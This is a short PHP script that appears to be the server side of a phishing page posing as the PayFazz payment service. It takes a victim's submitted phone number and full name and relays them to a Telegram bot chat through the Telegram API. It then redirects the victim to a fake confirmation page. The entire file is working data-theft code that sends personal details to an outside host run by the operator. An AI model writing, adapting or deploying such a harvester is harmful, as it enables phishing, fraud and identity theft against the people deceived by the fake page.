<?php
include "telegram.php";
session_start();

$nohp = $_POST['nohp'];
$nama = $_POST['nama'];

$_SESSION['nohp'] = $nohp;
$_SESSION['nama'] = $nohp;

$message = "
( PayFazz | Semangat ❤️ )

- Nomer Telpon: ".$nohp."
- Nama Lengkap : ".$nama."
 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../konfirmasi.html');
?>
